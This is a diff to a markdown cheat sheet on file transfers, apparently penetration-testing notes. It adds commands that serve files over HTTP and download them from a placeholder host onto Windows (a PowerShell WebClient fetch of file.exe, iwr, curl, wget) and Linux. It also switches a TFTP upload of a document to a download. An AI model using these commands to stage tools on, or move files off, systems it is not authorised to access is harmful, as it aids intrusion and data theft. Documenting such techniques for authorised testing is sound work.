@@ -1,4 +1,25 @@
 # File Transfers
+
+## HTTP
+```
+python -m SimpleHTTPServer 80
+```
+
+-> Windows
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Users\user\Desktop\file.exe')"
+iwr -uri http://<IP>/file -Outfile file
+wget http://<IP>/file -O file
+curl http://<IP>/file -o file
+```
+
+-> Linux
+```
+curl http://<IP>/file
+wget http://<IP>/file
+curl  http://<IP>/file > file
+```
+
 ## SMB Server
 -> Setting
 ```
@@ -25,7 +46,7 @@ sudo chown -R ftpuser:ftpgroup /ftphome/
 sudo systemctl restart pure-ftpd
 ```
 
--> Transfer
+-> transferring
 ```
 echo open 192.168.0.20 21> ftp.txt
 echo USER user>> ftp.txt
@@ -46,7 +67,8 @@ sudo mkdir /tftp
 sudo chown nobody: /tftp
 sudo atftpd --daemon --port 69 /tftp
 ```
--> Action
+
+-> transferring
 ```
-tftp -i <IP> put ok.docx
+tftp -i <IP> get file
 ```
